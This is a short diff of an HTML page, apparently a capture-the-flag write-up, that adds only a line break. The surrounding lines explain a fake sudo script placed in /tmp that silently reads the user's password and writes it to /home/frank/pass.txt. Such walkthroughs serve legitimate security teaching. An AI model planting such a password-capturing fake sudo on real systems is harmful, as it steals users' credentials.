@@ -40,7 +40,7 @@
                 <li>
                     <code>touch /tmp/sudo</code> creating our own sudo executable.
                 </li>
-                <li>content of sudo file
+                <li>content of sudo file <br>
                     <code>#!/bin/bash</code> -- I don't think i need to explain this.
                     <code>read -s password</code> -- after executes the command, this will read the password and store it in the password variable.
                     <code>echo $password > /home/frank/pass.txt</code> -- echoing the password from password variable to pass.txt so that we can read it.
